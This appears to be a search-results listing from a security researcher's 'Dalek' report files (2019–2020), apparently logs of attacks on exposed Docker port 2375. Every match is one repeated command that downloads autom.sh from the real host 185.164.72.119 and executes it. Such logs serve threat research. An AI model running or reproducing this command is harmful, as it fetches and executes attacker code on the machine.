@@ -1,0 +1,731 @@
+Results for "185.164.72.119" in "reports"
+
+C:\Users\<redacted>\Dalek\reports\2019_10_16\101.132.165.27.txt:
+  15:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_28\-exportproduct_docker_port_2375.json:
+  1959:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1959:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2205:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2205:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3022:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3022:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_29\-exportproduct_docker_port_2375.json:
+  2053:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2053:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2299:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2299:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_27\-export.json:
+  1650:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1650:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1904:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1904:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2723:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2723:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_27\-exportproduct_docker_port_2375.json:
+  1860:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1860:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2105:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2105:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2922:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2922:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_12\-exportproduct_docker_port_2375.json:
+  3824:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3824:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4078:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4078:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_13\-exportproduct_docker_port_2375.json:
+  4052:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4052:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_2\-exportproduct_docker_port_2375.json:
+  2551:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2551:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2808:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2808:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3624:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3624:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_3\-exportproduct_docker_port_2375.json:
+  2756:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2756:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2908:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2908:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3823:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3823:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_4\-exportproduct_docker_port_2375.json:
+  2850:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2850:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3104:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3104:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3922:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3922:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_6\-exportproduct_docker_port_2375.json:
+  3060:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3060:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3304:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3304:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4122:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4122:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_7\-exportproduct_docker_port_2375.json:
+  3260:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3260:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3505:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3505:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4342:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4342:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_8\-exportproduct_docker_port_2375.json:
+  3351:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3351:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3604:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3604:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_11\-exportdocker_port_2375.json:
+  27:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  27:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  27:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  27:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_11\-exportproduct_docker_port_2375.json:
+  26:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  26:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  26:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  26:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_10\-exportproduct_docker_port_2375.json:
+  725:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  725:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  725:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  725:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_13\-exportdocker_port_2375.json:
+  526:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  526:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  526:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  526:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_14\-exportproduct_docker_port_2375.json:
+  928:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  928:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  928:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  928:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_16\-exportproduct_docker_port_2375.json:
+  118:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  118:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  118:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  118:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_17\-exportproduct_docker_port_2375.json:
+  23:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  23:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  23:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  23:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_19\-exportproduct_docker_port_2375.json:
+  220:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  220:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  220:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  220:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_22\-exportproduct_docker_port_2375.json:
+  278:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  278:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  278:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  278:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  278:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  278:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_22\114.67.72.87.txt:
+  15:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  27:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  30:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  57:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  69:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  72:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_20\-exportproduct_docker_port_2375.json:
+  283:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  283:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  526:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  526:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  526:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  526:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_21\-exportproduct_docker_port_2375.json:
+  74:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  74:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  74:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  74:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  74:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  74:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  479:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  479:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  617:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  617:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  617:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  617:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_26\-exportproduct_docker_port_2375.json:
+  523:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  523:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  523:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  523:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  646:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  646:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  646:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  646:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1620:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1620:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1620:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1620:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_28\-exportproduct_docker_port_2375.json:
+  300:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  300:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  324:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  324:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  324:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  324:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  324:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  324:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  473:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  473:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  473:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  473:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  473:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  473:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1041:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1041:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1041:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1041:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_29\-exportproduct_docker_port_2375.json:
+  98:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  98:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  160:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  160:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  500:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  500:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  627:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  627:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  627:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  627:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  627:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  627:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  674:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  674:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  674:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  674:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  674:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  674:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1241:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1241:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1241:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1241:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_7\-exportproduct_docker_port_2375.json:
+  326:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  326:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  326:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  326:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_5\-exportproduct_docker_port_2375.json:
+  23:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  23:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  23:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  23:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_30\-exportproduct_docker_port_2375.json:
+  463:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  463:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  562:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  562:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  800:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  800:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  926:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  926:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  926:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  926:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  926:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  926:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  974:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  974:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  974:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  974:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  974:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  974:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1646:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1646:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1646:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1646:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_12\-exportproduct_docker_port_2375.json:
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
